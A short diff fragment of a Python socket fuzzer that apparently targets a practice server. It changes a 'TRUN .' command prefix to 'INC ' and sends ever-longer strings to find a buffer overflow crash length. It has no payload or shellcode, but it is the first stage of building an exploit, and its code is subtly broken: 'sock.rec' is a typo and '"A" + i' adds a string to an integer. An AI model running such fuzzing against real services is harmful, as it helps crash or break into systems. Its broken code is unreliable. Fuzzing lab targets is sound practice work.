@@ -6,7 +6,7 @@ msg = sock.rec(2048).decode()
 print(msg)
 for i in range(12100):
 	badstr = "A" + i
-	cmd = "TRUN ." + badstr
+	cmd = "INC " + badstr
 	print("Trying length " + str(i))
 	sock.send(cmd.encode())
 	msg = sock.recv(2048).decode()
